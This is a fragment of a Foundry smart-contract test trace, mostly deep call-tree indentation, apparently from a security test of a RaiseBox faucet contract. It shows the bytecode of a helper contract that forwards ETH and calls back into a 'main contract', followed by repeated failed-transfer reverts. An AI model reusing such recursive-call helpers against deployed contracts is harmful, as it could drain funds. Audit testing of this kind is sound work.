    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [OutOfGas] 0x608060405260043610610021575f3560e01c8063d30756e0146100f4576100f0565b366100f0575f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163460405161006b90610243565b5f6040518083038185875af1925050503d805f81146100a5576040519150601f19603f3d011682016040523d82523d5f602084013e6100aa565b606091505b50509050806100ee576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100e5906102b1565b60405180910390fd5b005b5f5ffd5b3480156100ff575f5ffd5b5061010861010a565b005b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610198576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161018f90610319565b60405180910390fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b91e21f86040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156101fe575f5ffd5b505af1158015610210573d5f5f3e3d5ffd5b50505050565b5f81905092915050565b50565b5f61022e5f83610216565b915061023982610220565b5f82019050919050565b5f61024d82610223565b9150819050919050565b5f82825260208201905092915050565b7f7472616e7366657220746f206d61696e20636f6e7472616374206661696c65645f82015250565b5f61029b602083610257565b91506102a682610267565b602082019050919050565b5f6020820190508181035f8301526102c88161028f565b9050919050565b7f6f6e6c79206d61696e20636f6e74726163742063616e2063616c6c00000000005f82015250565b5f610303601b83610257565b915061030e826102cf565b602082019050919050565b5f6020820190508181035f830152610330816102f7565b905091905056fea2646970667358221220001eefffc48479366a4ce0c95556fd41bdd04fa8c117f8d10449e2561624581564736f6c634300081e0033
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
